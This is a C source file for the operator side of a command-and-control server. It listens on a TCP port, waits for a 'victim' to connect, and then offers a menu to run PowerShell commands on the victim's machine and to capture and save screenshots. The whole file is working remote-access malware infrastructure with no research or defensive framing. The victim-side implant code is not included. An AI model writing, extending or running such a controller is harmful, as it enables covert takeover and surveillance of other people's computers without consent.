#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include "c2.h"
#include "common.h"
#include "server/server_psh.h"

int main() {
    // Client and server socket file descriptors
    sock_t server_fd, client_fd;

    // Socket address structure
    struct sockaddr_in addr = {0};
    socklen_t addr_len = sizeof(addr);

    SOCK_INIT();

    // Create a TCP socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    // Config
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;         
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }
    // Begin listening and accept one connection
    if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); } 

    printf("[*] C2 listening on 0.0.0.0:%d\n", C2_PORT);

    // Waiting for client connection
    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
    if (client_fd < 0) { perror("accept"); exit(1); }
    printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));

    // Main loop
    while(1) {
        char buf[C2_BUF_SIZE], cmd[5];
        printf("[*] Command list, type quit to exit:\n");
        printf("1. Execute powershell command.\n");
        printf("2. Take screenshot.\n");
        if (!fgets(cmd, sizeof(cmd), stdin)) break;
        cmd[strcspn(cmd, "\n")] = '\0'; // remove newline if present

        if (strcmp(cmd, "quit") == 0) break;

        if (strcmp(cmd, "1") == 0) {
            // Start powershell session
            if (safe_send(client_fd, "1", 1, 0) <= 0) {
                break;
            }
            psh_send(client_fd);
        } else if (strcmp(cmd, "2") == 0) {
            if (safe_send(client_fd, "2", 1, 0) <= 0) {
                break;
            }

            int file_size;
            BYTE* file_buffer = (BYTE*)safe_recv_payload(client_fd, &file_size, 0);
            if (file_buffer == NULL) break;

            char filename[64];
            time_t now = time(NULL);
            snprintf(filename, sizeof(filename), "screenshot_%ld.bmp", (long)now);

            FILE *fp = fopen(filename, "wb");
            if (!fp) {
                perror("fopen");
                free(file_buffer);
                continue;
            }

            fwrite(file_buffer, 1, file_size, fp);
            fclose(fp);
            free(file_buffer);

            printf("[+] Screenshot saved to %s (%u bytes)\n", filename, file_size);
            continue;
        } else {
            printf("[ERR] Invalid command.\n");
        }

    }

    CLOSE_SOCK(client_fd);  
    CLOSE_SOCK(server_fd);
    SHUT_DOWN();
    return 0; 
}